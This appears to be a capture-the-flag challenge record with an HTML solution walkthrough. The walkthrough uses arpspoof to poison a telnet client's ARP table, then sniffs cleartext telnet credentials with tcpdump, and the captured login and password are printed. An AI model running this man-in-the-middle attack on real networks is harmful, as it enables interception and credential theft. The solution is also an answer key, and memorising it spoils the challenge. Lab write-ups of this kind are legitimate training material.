{"description":"Try to enter to telnet server with telnet client credentials","goal":"<p style=\"text-align: center;\">Your goal is to find the secret inside the telnet server.</p>","solution":"<p>The credentials are:&nbsp;</p>\n<p><em>login name</em>: <strong>jack</strong></p>\n<p><em>Password</em>: <strong>MyPasswordALittleComplex&nbsp;</strong></p>\n<p>&nbsp;</p>\n<p>Our address is 192.168.2.3, while the telnet client IP is 192.168.2.4. Router doesn't allow to sniff the telnet client traffic, how you can see by looking at tcpdump traffic:&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">root@8e72a07ade9b:/dump_sniff# tcpdump -i eth0 -A</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes</p>\n<p>&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">nothing...&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p>We've to do a MITM attack. We poison the client arp table so he thinks that router address is our address and all his traffic go through our kali machine:&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">root@8e72a07ade9b:/dump_sniff# arpspoof -i eth0 -t 192.168.2.4 192.168.2.2 2&gt; /dev/null &amp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">[1] 50</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">root@8e72a07ade9b:/dump_sniff# ps</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp; PID TTY&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TIME CMD</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;&nbsp; 29 ?&nbsp; &nbsp; &nbsp; &nbsp; 00:00:00 bash</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;&nbsp; 50 ?&nbsp; &nbsp; &nbsp; &nbsp; 00:00:00 arpspoof</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;&nbsp; 51 ?&nbsp; &nbsp; &nbsp; &nbsp; 00:00:00 ps</p>\n<p>&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">root@8e72a07ade9b:/dump_sniff#&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\"><span style=\"color: #000000; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px;\">This command send attacks the arp table of the client by poisoning the real router ip address (it send a gratouitous arp reply to client saying that the router ip address is our ip...).&nbsp;</span></p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\"><span style=\"color: #000000; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px;\">Now let's try again tcpdump:&nbsp;</span></p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">tcpdump -i eth0 -A</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\"><span style=\"color: #000000; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px;\">By looking at the pcap results we found the login and the password: </span></p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545; min-height: 14px;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545; min-height: 14px;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:51.948665 IP 192.168.1.3.telnet &gt; telnetaccess_telnet_client_1.telnetaccess_internal_network.40294: Flags [P.], seq 1:7, ack 6, win 227, options [nop,nop,TS val 12294282 ecr 12294282], length 6</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..:.'@.?.(?...........f......Sz...........</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........<strong>jack</strong></p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545; min-height: 14px;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:51.948920 IP 192.168.1.3.telnet &gt; telnetaccess_telnet_client_1.telnetaccess_internal_network.40294: Flags [P.], seq 7:17, ack 6, win 227, options [nop,nop,TS val 12294282 ecr 12294282], length 10</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..&gt;.(@.?.(:...........f......Sz...........</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........Password:&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:52.812358 ARP, Reply telnetaccess_telnet_client_1.telnetaccess_internal_network is-at 02:42:c0:a8:02:03 (oui Unknown), length 28</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">.........B.........B........</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:52.954609 IP telnetaccess_telnet_client_1.telnetaccess_internal_network.40294 &gt; 192.168.1.3.telnet: Flags [P.], seq 6:32, ack 17, win 229, options [nop,nop,TS val 12294383 ecr 12294282], length 26</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..N..@.@..E.........f....Sz...............</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........<strong>MyPasswordALittleComplex</strong></p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545; min-height: 14px;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:52.954655 IP telnetaccess_telnet_client_1.telnetaccess_internal_network.40294 &gt; 192.168.1.3.telnet: Flags [P.], seq 6:32, ack 17, win 229, options [nop,nop,TS val 12294383 ecr 12294282], length 26</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..N..@.?..E.........f....Sz...............</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........MyPasswordALittleComplex</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545; min-height: 14px;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:52.955428 IP 192.168.1.3.telnet &gt; telnetaccess_telnet_client_1.telnetaccess_internal_network.40294: Flags [P.], seq 17:19, ack 32, win 227, options [nop,nop,TS val 12294383 ecr 12294383], length 2</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..6.)@.?.(A...........f......S............</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545; min-height: 14px;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:52.955464 IP 192.168.1.3.telnet &gt; telnetaccess_telnet_client_1.telnetaccess_internal_network.40294: Flags [P.], seq 17:19, ack 32, win 227, options [nop,nop,TS val 12294383 ecr 12294383], length 2</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..6.)@.&gt;.)A...........f......S............</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545; min-height: 14px;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:52.955505 IP telnetaccess_telnet_client_1.telnetaccess_internal_network.40294 &gt; 192.168.1.3.telnet: Flags [.], ack 19, win 229, options [nop,nop,TS val 12294383 ecr 12294383], length 0</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..4..@.@..^.........f....S..........~.....</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:52.955525 IP telnetaccess_telnet_client_1.telnetaccess_internal_network.40294 &gt; 192.168.1.3.telnet: Flags [.], ack 19, win 229, options [nop,nop,TS val 12294383 ecr 12294383], length 0</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..4..@.?..^.........f....S..........~.....</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">........</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">21:05:52.965247 IP 192.168.1.3.telnet &gt; telnetaccess_telnet_client_1.telnetaccess_internal_network.40294: Flags [P.], seq 19:39, ack 32, win 227, options [nop,nop,TS val 12294384 ecr 12294383], length 20</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">E..H.*@.?.(............f......S............</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<h3 style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\"><span style=\"color: #000000; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px;\">Why don't you use Wireshark? &nbsp;</span></h3>\n<p><span style=\"color: #000000; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px;\">We can redirect tcpdump results on our best sniffing tool: Wireshark. In order to do this&nbsp;copy in your host the pcap file that you can generate with tcpdump:&nbsp;</span></p>\n<p>&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">tcpdump -i eth0 -A -w mycap.pcap</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"color: #000000; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; font-style: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: auto; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: #ffffff;\"><span style=\"color: #000000; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px;\">Wait sometimes in order to get more packets. Stop the command and &nbsp;read him with Wireshark. Set Wireshark filter to \"telnet\" in order to get only the telnet traffic, now right click on a telnet packet, press &nbsp;<strong>follow tcp stream&nbsp;</strong>and ... look what's show wireshark :)</span></p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>\n<p style=\"margin: 0px; font-size: 12px; line-height: normal; font-family: 'Helvetica Neue'; color: #454545;\">&nbsp;</p>","author":"giper"}
